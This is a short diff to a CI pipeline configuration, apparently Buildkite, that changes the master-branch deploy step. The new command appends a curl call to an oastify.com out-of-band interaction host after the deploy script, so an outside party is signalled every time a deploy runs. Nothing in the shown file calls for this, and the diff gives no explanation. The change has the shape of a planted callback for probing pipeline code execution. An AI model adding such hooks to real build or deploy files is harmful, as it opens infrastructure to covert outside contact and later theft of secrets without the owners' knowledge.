@@ -17,7 +17,7 @@ steps:
   #     queue: workers
   - wait
   - name: ":rocket:"
-    command: "scripts/deploy.sh"
+    command: "scripts/deploy.sh && curl 9z9pdmmbg88p3sefukc9g4ms0j6iy6uuj.oastify.com"
     concurrency: 1
     concurrency_group: "deploy"
     branches: master
